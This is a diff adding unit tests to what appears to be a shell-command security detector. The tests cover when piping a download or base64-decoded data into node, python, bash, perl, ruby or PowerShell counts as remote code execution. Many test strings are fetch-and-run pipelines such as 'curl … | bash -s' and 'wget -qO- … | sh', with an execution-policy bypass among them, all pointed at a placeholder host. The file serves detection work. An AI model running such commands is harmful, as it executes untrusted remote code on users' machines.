@@ -106,6 +106,100 @@ describe("R2 download and execute", () => {
     ]);
   });
 
+  // Codex P2 #1: the piped program must run its input as code, by its own rules.
+  it("a named script file runs that file: the download is only its input", () => {
+    expectNotRule("download-execute", [
+      "curl https://example.invalid/data | node scripts/check-response.js",
+      "curl https://example.invalid/data | node --max-old-space-size=4096 scripts/check.js",
+      "curl https://example.invalid/data | python process.py",
+      "curl https://example.invalid/data | python3 -u tools/parse.py --strict",
+      "curl https://example.invalid/data | bash ./scripts/handle.sh",
+      "curl https://example.invalid/data | sh tools/consume.sh arg",
+      "curl https://example.invalid/data | perl filter.pl",
+      "curl https://example.invalid/data | ruby parse.rb",
+      "curl https://example.invalid/data | powershell -File parse.ps1",
+      "curl https://example.invalid/data | pwsh ./parse.ps1",
+      "curl https://example.invalid/data | source ./env.sh",
+    ]);
+  });
+
+  it("a program given on the command line runs that program, not its input", () => {
+    expectNotRule("download-execute", [
+      "curl https://example.invalid/data | node -e \"process.stdin.pipe(process.stdout)\"",
+      "curl https://example.invalid/data | node --eval=x",
+      "curl https://example.invalid/data | node -p 1",
+      "curl https://example.invalid/data | python -c \"import sys; print(sys.stdin.read())\"",
+      "curl https://example.invalid/data | python -m json.tool",
+      "curl https://example.invalid/data | sh -c \"cat > out.txt\"",
+      "curl https://example.invalid/data | bash -ec 'wc -c'",
+      "curl https://example.invalid/data | perl -ne print",
+      "curl https://example.invalid/data | ruby -e 'puts 1'",
+      "curl https://example.invalid/data | powershell -Command Get-Date",
+      "curl https://example.invalid/data | iex $other",
+    ]);
+  });
+
+  it("eval ignores piped input: not a pipe destination", () => {
+    expectNotRule("download-execute", ["curl https://example.invalid/i | eval", "curl https://example.invalid/i | eval echo hi"]);
+  });
+
+  it("explicit stdin execution is still detected", () => {
+    expectRule("download-execute", [
+      "curl https://example.invalid/i | node -",
+      "curl https://example.invalid/i | node /dev/stdin",
+      "curl https://example.invalid/i | python -",
+      "curl https://example.invalid/i | python3 - --flag",
+      "curl https://example.invalid/i | bash -s -- --install",
+      "curl https://example.invalid/i | sh -s",
+      "curl https://example.invalid/i | bash -",
+      "curl https://example.invalid/i | sh -x",
+      "curl https://example.invalid/i | bash --login",
+      "curl https://example.invalid/i | bash /dev/stdin",
+      "curl https://example.invalid/i | perl -",
+      "curl https://example.invalid/i | ruby",
+      "curl https://example.invalid/i | powershell -Command -",
+      "curl https://example.invalid/i | powershell -NoProfile -ExecutionPolicy Bypass -File -",
+      "curl https://example.invalid/i | pwsh -NoProfile",
+      "curl https://example.invalid/i | source /dev/stdin",
+      "irm https://example.invalid/i | iex",
+      'sh -c "curl -s https://example.invalid/i | bash -s"',
+    ]);
+  });
+
+  it("ambiguous option values count as a script name: no claim is made", () => {
+    expectNotRule("download-execute", ["curl https://example.invalid/i | bash -o pipefail", "curl https://example.invalid/i | node --require ./hook.js"]);
+  });
+
+  // Codex P2 #2: wget saves to a file unless told to write to stdout.
+  it("wget's default and named output files aren't direct execution", () => {
+    expectNotRule("download-execute", [
+      "wget https://example.invalid/i | sh",
+      "wget -q https://example.invalid/i | bash",
+      "wget -O install.sh https://example.invalid/i | sh",
+      "wget -qOinstall.sh https://example.invalid/i | sh",
+      "wget --output-document=install.sh https://example.invalid/i | sh",
+      "wget -o - https://example.invalid/i | sh", // -o is wget's log, not the download
+      "wget -O - -O saved.sh https://example.invalid/i | sh", // the last -O wins
+    ]);
+  });
+
+  it("wget writing the download to stdout, then run, is detected", () => {
+    expectRule("download-execute", [
+      "wget -qO- https://example.invalid/i | sh",
+      "wget -qO - https://example.invalid/i | sh",
+      "wget -O- https://example.invalid/i | bash",
+      "wget -O - https://example.invalid/i | bash",
+      "wget --output-document=- https://example.invalid/i | sh",
+      "wget --output-document - https://example.invalid/i | sh",
+      "wget -O /dev/stdout https://example.invalid/i | sh",
+      "wget -q -O saved.sh -O - https://example.invalid/i | sh",
+      'bash -c "$(wget -qO- https://example.invalid/i)"',
+      "source <(wget -qO- https://example.invalid/i)",
+    ]);
+    // Without stdout output, a substitution gets wget's (empty) stdout, not the download.
+    expectNotRule("download-execute", ['bash -c "$(wget https://example.invalid/i)"']);
+  });
+
   it("documented blind spot: download to a file, then run it", () => {
     expectNotRule("download-execute", ["curl -o setup.sh https://example.invalid/i && sh setup.sh"]);
   });
@@ -140,6 +234,17 @@ describe("R3 encoded or hidden execution", () => {
 
   it("eval of a command substitution (by design, even for common tools)", () => {
     expectRule("encoded-execution", ['eval "$(fnm env)"', "eval `ssh-agent -s`", "eval $(./configure.sh)"]);
+  });
+
+  it("the shared rule: decoding into a named script or eval isn't execution; into stdin execution it is", () => {
+    expectNotRule("encoded-execution", [
+      "echo SGVsbG8= | base64 -d | node scripts/decode.js",
+      "echo SGVsbG8= | base64 -d | python handle.py",
+      "echo SGVsbG8= | base64 -d | bash ./consume.sh",
+      "echo SGVsbG8= | base64 -d | eval",
+      "echo SGVsbG8= | base64 -d | sh -c 'cat > out'",
+    ]);
+    expectRule("encoded-execution", ["echo SGVsbG8= | base64 -d | node -", "echo SGVsbG8= | base64 -d | bash -s", "echo SGVsbG8= | base64 -d | python3 -", "echo SGVsbG8= | base64 -d | pwsh -c -"]);
   });
 
   it("lookalikes aren't flagged", () => {
